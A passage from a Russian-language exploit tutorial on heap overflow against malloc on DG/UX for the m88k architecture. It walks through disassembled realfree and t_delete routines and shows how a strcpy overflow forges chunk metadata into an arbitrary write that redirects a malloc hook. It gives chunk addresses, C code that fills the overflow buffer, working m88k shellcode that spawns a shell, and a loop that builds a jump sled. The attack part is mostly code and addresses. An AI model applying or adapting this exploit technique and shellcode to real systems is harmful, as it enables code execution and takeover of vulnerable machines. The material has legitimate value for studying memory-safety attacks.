0x800602f8 <realfree+520>:      bcnd            eq0,r12, <realfree+528>
0x800602fc <realfree+524>:      st              r23,r12,0x10
0x80060300 <realfree+528>:      st              r12,r23,0x30
0x80060304 <realfree+532>:      st              r24,r23,0x40
0x80060308 <realfree+536>:      st              r23,r24,0x10
0x8006030c <realfree+540>:      st              r10,r24,0x20
0x80060310 <realfree+544>:      br               <realfree+552>

0x80060314 <realfree+548>:      st              r23,r0,r13
0x80060318 <realfree+552>:      tb1             0x01,r0,0xff
0x8006031c <realfree+556>:      ld              r12,r0,r23
0x80060320 <realfree+560>:      addu            r12,r23,r12
0x80060324 <realfree+564>:      ld              r13,r12,0x10
0x80060328 <realfree+568>:      or              r13,r13,0x02
0x8006032c <realfree+572>:      st              r13,r12,0x10
0x80060330 <realfree+576>:      ld              r1,r31,0x40
0x80060334 <realfree+580>:      ld              r21,r31,0x2c
0x80060338 <realfree+584>:      ld.d            r24,r31,0x38
0x8006033c <realfree+588>:      ld.d            r22,r31,0x30
0x80060340 <realfree+592>:      jmp.n           r1
0x80060344 <realfree+596>:      addu            r31,r31,0x50
----------------------------------------------------------- end  of realfree.S

 Ну  вот  мы  и  добрались  к  сути  -  t_delete.  Обратите внимание  на строки
 0x800604c0 - 0x800604d4. $r24 = $r2  =  адресу  чанка т.е. контролируемой нами
 памяти.   т.е.   мы   пишем   по  адресу  *(*(chank+0x10)+0x40)=*(chank+0x10).
 Единственное, что омрачает ситуацию это то, что пишем мы еще и по адресу 0x40.
 Т.е.  нам  надо  либо  шеллкод  вложить  в 16 команд, либо попрыгать немного в
 шеллкоде. Мы пойдем вторым путем по 2 причинам:

 1) - 16 байт все-таки оказалось достаточно, но мало ли что понадобится в
      дальнейшем.

 2) - прыгать мы будем по стеку - т.е. смещение будет зависеть от кучи входных 
      факторов  (таких  как переменные  окружения и длина командной строки), а
      стандартными  nop-ами эту  проблему  не решить, т.к. впереди по смещению
      0x40 нас будет ждать Illegal Instruction.

----------------------------------------------------------- begin of t_delete.S
0x80060490 <t_delete>:  subu            r31,r31,0x40
0x80060494 <t_delete+4>:        st              r1,r31,0x30
0x80060498 <t_delete+8>:        st.d            r24,r31,0x28
0x8006049c <t_delete+12>:       or              r24,r0,r2
0x800604a0 <t_delete+16>:       or.u            r25,r0,0x04
0x800604a4 <t_delete+20>:       tb1             0x01,r0,0xff

0x800604a8 <t_delete+24>:       ld              r13,r24,0x20
0x800604ac <t_delete+28>:       bsr.n            <t_delete+36>
0x800604b0 <t_delete+32>:       or              r25,r25,0xb1c4
0x800604b4 <t_delete+36>:       addu            r13,r13,0x01

0x800604b8 <t_delete+40>:       bcnd.n          ne0,r13, <t_delete+72> 
0x800604bc <t_delete+44>:       addu            r25,r25,r1

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

0x800604c0 <t_delete+48>:       ld              r10,r24,0x10
0x800604c4 <t_delete+52>:       ld              r12,r24,0x40
0x800604c8 <t_delete+56>:       bcnd            eq0,r12, <t_delete+64>
0x800604cc <t_delete+60>:       st              r10,r12,0x10
0x800604d0 <t_delete+64>:       st              r12,r10,0x40
0x800604d4 <t_delete+68>:       br              <t_delete+480>

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

0x800604d8 <t_delete+72>:       tb1             0x01,r0,0xff
0x800604dc <t_delete+76>:       ld              r13,r24,0x10
0x800604e0 <t_delete+80>:       bcnd            eq0,r13, <t_delete+92>
0x800604e4 <t_delete+84>:       bsr.n            <t_splay>
0x800604e8 <t_delete+88>:       or              r2,r0,r24
0x800604ec <t_delete+92>:       tb1             0x01,r0,0xff

0x800604f0 <t_delete+96>:       ld              r10,r24,0x40
0x800604f4 <t_delete+100>:      bcnd            eq0,r10, <t_delete+160>
0x800604f8 <t_delete+104>:      st              r0,r10,0x10
0x800604fc <t_delete+108>:      tb1             0x01,r0,0xff
0x80060500 <t_delete+112>:      ld              r12,r24,0x20
0x80060504 <t_delete+116>:      bcnd            eq0,r12, <t_delete+124>
0x80060508 <t_delete+120>:      st              r10,r12,0x10
0x8006050c <t_delete+124>:      st              r12,r10,0x20
0x80060510 <t_delete+128>:      tb1             0x01,r0,0xff
0x80060514 <t_delete+132>:      ld              r12,r24,0x30
0x80060518 <t_delete+136>:      bcnd            eq0,r12, <t_delete+144>
0x8006051c <t_delete+140>:      st              r10,r12,0x10
0x80060520 <t_delete+144>:      ld              r13,r25,0x450
0x80060524 <t_delete+148>:      st              r12,r10,0x30
0x80060528 <t_delete+152>:      br.n             <t_delete+480>
0x8006052c <t_delete+156>:      st              r10,r0,r13
0x80060530 <t_delete+160>:      tb1             0x01,r0,0xff
0x80060534 <t_delete+164>:      ld              r10,r24,0x20
0x80060538 <t_delete+168>:      bcnd            eq0,r10, <t_delete+456>
0x8006053c <t_delete+172>:      st              r0,r10,0x10
0x80060540 <t_delete+176>:      tb1             0x01,r0,0xff
0x80060544 <t_delete+180>:      ld              r13,r24,0x30
0x80060548 <t_delete+184>:      bcnd            eq0,r13, <t_delete+472>

0x8006054c <t_delete+188>:      tb1             0x01,r0,0xff
0x80060550 <t_delete+192>:      ld              r12,r10,0x30
0x80060554 <t_delete+196>:      bcnd            eq0,r12, <t_delete+428>
0x80060558 <t_delete+200>:      ld              r11,r12,0x30
0x8006055c <t_delete+204>:      bcnd            eq0,r11, <t_delete+316>
0x80060560 <t_delete+208>:      ld              r13,r11,0x20
0x80060564 <t_delete+212>:      st              r13,r12,0x30
0x80060568 <t_delete+216>:      tb1             0x01,r0,0xff
0x8006056c <t_delete+220>:      ld              r13,r12,0x30
0x80060570 <t_delete+224>:      bcnd            eq0,r13, <t_delete+236>
0x80060574 <t_delete+228>:      ld              r13,r12,0x30
0x80060578 <t_delete+232>:      st              r12,r13,0x10
0x8006057c <t_delete+236>:      tb1             0x01,r0,0xff
0x80060580 <t_delete+240>:      ld              r13,r10,0x10
0x80060584 <t_delete+244>:      st              r13,r11,0x10
0x80060588 <t_delete+248>:      tb1             0x01,r0,0xff
0x8006058c <t_delete+252>:      ld              r13,r11,0x10
0x80060590 <t_delete+256>:      bcnd            eq0,r13, <t_delete+300>
0x80060594 <t_delete+260>:      ld              r13,r10,0x10
0x80060598 <t_delete+264>:      ld              r13,r13,0x20
0x8006059c <t_delete+268>:      cmp             r13,r13,r10
0x800605a0 <t_delete+272>:      bb1             0x03,r13, <t_delete+288>
0x800605a4 <t_delete+276>:      ld              r13,r11,0x10
0x800605a8 <t_delete+280>:      st              r11,r13,0x20
0x800605ac <t_delete+284>:      br               <t_delete+300>
0x800605b0 <t_delete+288>:      tb1             0x01,r0,0xff
0x800605b4 <t_delete+292>:      ld              r13,r11,0x10
0x800605b8 <t_delete+296>:      st              r11,r13,0x30
0x800605bc <t_delete+300>:      st              r11,r10,0x10
0x800605c0 <t_delete+304>:      st              r10,r11,0x20
0x800605c4 <t_delete+308>:      br.n             <t_delete+188>
0x800605c8 <t_delete+312>:      or              r10,r0,r11
0x800605cc <t_delete+316>:      tb1             0x01,r0,0xff
0x800605d0 <t_delete+320>:      ld              r13,r12,0x20
0x800605d4 <t_delete+324>:      st              r13,r10,0x30
0x800605d8 <t_delete+328>:      tb1             0x01,r0,0xff
0x800605dc <t_delete+332>:      ld              r13,r10,0x30
0x800605e0 <t_delete+336>:      bcnd            eq0,r13, <t_delete+348>
0x800605e4 <t_delete+340>:      ld              r13,r10,0x30
0x800605e8 <t_delete+344>:      st              r10,r13,0x10
0x800605ec <t_delete+348>:      tb1             0x01,r0,0xff
0x800605f0 <t_delete+352>:      ld              r13,r10,0x10
0x800605f4 <t_delete+356>:      st              r13,r12,0x10
0x800605f8 <t_delete+360>:      tb1             0x01,r0,0xff
0x800605fc <t_delete+364>:      ld              r13,r12,0x10
0x80060600 <t_delete+368>:      bcnd            eq0,r13, <t_delete+412>
0x80060604 <t_delete+372>:      ld              r13,r10,0x10
0x80060608 <t_delete+376>:      ld              r13,r13,0x20
0x8006060c <t_delete+380>:      cmp             r13,r13,r10
0x80060610 <t_delete+384>:      bb1             0x03,r13, <t_delete+400>
0x80060614 <t_delete+388>:      ld              r13,r12,0x10
0x80060618 <t_delete+392>:      st              r12,r13,0x20
0x8006061c <t_delete+396>:      br               <t_delete+412>
0x80060620 <t_delete+400>:      tb1             0x01,r0,0xff
0x80060624 <t_delete+404>:      ld              r13,r12,0x10
0x80060628 <t_delete+408>:      st              r12,r13,0x30
0x8006062c <t_delete+412>:      st              r10,r12,0x20
0x80060630 <t_delete+416>:      st              r12,r10,0x10
0x80060634 <t_delete+420>:      br.n             <t_delete+188>
0x80060638 <t_delete+424>:      or              r10,r0,r12
0x8006063c <t_delete+428>:      tb1             0x01,r0,0xff
0x80060640 <t_delete+432>:      ld              r13,r24,0x30
0x80060644 <t_delete+436>:      st              r13,r10,0x30
0x80060648 <t_delete+440>:      tb1             0x01,r0,0xff
0x8006064c <t_delete+444>:      ld              r13,r10,0x30
0x80060650 <t_delete+448>:      st              r10,r13,0x10
0x80060654 <t_delete+452>:      br               <t_delete+472>
0x80060658 <t_delete+456>:      tb1             0x01,r0,0xff
0x8006065c <t_delete+460>:      ld              r10,r24,0x30
0x80060660 <t_delete+464>:      bcnd            eq0,r10, <t_delete+472>
0x80060664 <t_delete+468>:      st              r0,r10,0x10
0x80060668 <t_delete+472>:      ld              r13,r25,0x450
0x8006066c <t_delete+476>:      st              r10,r0,r13
0x80060670 <t_delete+480>:      ld              r1,r31,0x30
0x80060674 <t_delete+484>:      ld.d            r24,r31,0x28
0x80060678 <t_delete+488>:      jmp.n           r1
0x8006067c <t_delete+492>:      addu            r31,r31,0x40

----------------------------------------------------------- end of t_delete.S

 Вопрос что писать мы вроде бы решили - адрес стека с шелкодом. Осталось решить
 куда.  .plt  таблица  нам  не  подойдет, так как адресация всех сегментов кода
 начинается с нулей, которые естественно все попортят в данном случае (напомню,
 что мы имеем дело с strcpy).
 
 Как записать адрес,начинающийся с нулей,мне в голову не пришло, если кто знает
 свяжитесь  со  мной.  Кстати  именно  по  этой причине мы и выбрали размещение
 шеллкода в стеке. Вот тут на помощь приходят уже упомянутые malloc хуки. Также
 достоинством   этих хуков является то, что они находятся прямо в malloc, и это
 значит,  что нам не придется бродить по коду вычищая bus_error'ы и обращения к
 несуществующей памяти. Недостаток зависимость от libc, но это не очень страшно
 по  причине  того,  что  адрес, по  которому  должен хранится хук, можно очень
 примитивно вытащить из самой libc.so - как он вычисляется, смотрите в описании
 маллока.


 Ну теперь попробуем обобщить, что же нам надо в конце концов сделать.

 1) Найти уже работающий последний чанк. например 0x0011d3c8

 2) Найти размер выполняемого программой маллока.Например 0x400 и создать по
    адресу (0x0011d3c8 + 0x400 + 0x10) чанк с длинной малого  отрицательного 
    числа (это не обязательно кстати, но чем меньше памяти мы используем для 
    переполнения тем спокойнее на душе)

	// BB chank с которым будет работать программа при малоке.
	// BB = 0x0011d3c8 + 0x400 + 0x10
	// STARTEVIL - OUR VICTIM (см. начало статьи)
	unsigned int STARTEVIL=0x0011ee50;
	FIRSTCH=BB-0x410;
	CHANKINF=STARTEVIL;
	EVILCH=STARTEVIL+0x400-BB;

 Я рассчитывал длину так, чтобы оказаться прямо в начале перезаписываемой мною 
 памяти.

 3) Создаем чанк который как бы является в середине списка (нужно для t_delete)
    но его необходимо убить.
	
	unsigned int EVILCH40=0x800aca28; // LOOK at *(.got+0x24)+0x08+0x10
	unsigned int EVILCH10=0xeffffeec; // SP
	unsigned int EVILCH0=0xFFFFFFC0;  // Помечаем, что  чанк  надо удалять
	unsigned int EVILCH20=0xFFFFFFFF; // На всякий  случай (какие то  биты 
                                          // отсюда используются и должны быть
                                          // 1)
	
	memcpy(evil+FIRSTCH-STARTEVIL,&EVILCH,4);
	memcpy(evil+CHANKINF-STARTEVIL,&EVILCH0,4);
	memcpy(evil+CHANKINF-STARTEVIL+0x10,&EVILCH10,4);
	memcpy(evil+CHANKINF-STARTEVIL+0x20,&EVILCH20,4);
	memcpy(evil+CHANKINF-STARTEVIL+0x40,&EVILCH40,4);

 4) Пишем шеллкод.

	text
	        align    8
	        global   main
	main:
	subu        r30,r31,0x114	; 67 df 01 14     
	or.u        r10,r0,0x2f74       ; 5d 40 2f 74     
	or          r11,r10,0x6d70      ; 59 6a 6d 70     
	or.u        r12,r0,0x2f73       ; 5d 80 2f 73     
	or          r13,r12,0x6944      ; 59 ac 69 44     
	subu        r13,r13,0x144       ; 65 ad 01 44     
	st          r11,r30,0x110       ; 25 7e 01 10     
	st          r13,r30,0x114       ; 25 be 01 14     
	addu        r2,r30,0x110        ; 60 5e 01 10     
	st          r2,r30,0x108        ; 24 5e 01 08     
	st          r0,r30,0x10c        ; 24 1e 01 0c     
	addu        r3,r30,0x108        ; 60 7e 01 08     
	addu        r4,r30,0x108        ; 60 9e 01 08     
	or          r9,r0,0x109         ; 59 20 01 09     
	subu        r9,r9,0x101         ; 65 29 01 01     
	tb0         0,r1,0x1c2          ; f0 01 d1 c2     
	
 Шелкод написан, скорее всего, bawd'ом, хотя возможно,что сгенерировался сам по
 себе :)



 5) обрамляем его jump.

 mydecome=-(short)((sizeof(shell)-1)/4);mydecome++;
 for (i=EVILSIZE-SHOFF+INC+sizeof(shell)-1;i<EVILSIZE;i+=4) 

 {
	// br	0xc3 0xff (количество команд относительно этой) всего 4 байта
	mydecome--;
	if (mydecome % 0xFF == 0) continue;
	evil[i]=0xc3;
	evil[i+1]=0xff;
	memcpy(evil+i+2,&mydecome,2);
	mydecome--;
 }


 На этой этой оптимистической ноте я бы хотел и завершить наше путешествие в
 чудесную страну DGUXов.


 References.

 [1] http://phrack.org/phrack/57/p57-0x09
 [2] http://www.opensource.apple.com/darwinsource/10.3/gas-495/m88k.c
